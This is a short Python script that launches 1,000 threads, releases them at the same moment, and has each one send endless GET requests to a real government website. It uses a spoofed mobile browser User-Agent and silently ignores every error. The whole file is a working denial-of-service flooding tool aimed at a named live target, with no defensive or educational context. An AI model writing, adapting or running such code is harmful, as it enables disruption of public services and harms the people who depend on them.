import threading
import os

def hello():
   
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH199) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'}

    while True:
        a = requests.get("https://www.india.gov.in", headers=headers)
        print(a.status_code)
        


threads = 1000

just = threading.Event()

def threading_chamber():

    global threads
    x = 0
    for i in range(threads):
        print(i)
        create_thread(x + 1).start()
        print("Thread " + str(i) + "ready!" )
    just.set()

class create_thread(threading.Thread):

    def __init__(self,
                 counter):
        threading.Thread.__init__(self)
        self.counter =  counter


    def run(self):
        just.wait()
        while True:
            try:
                work()
            except:
                print("Work def error!")

def work():
    try:
        hello()

    except:
        pass

threading_chamber()
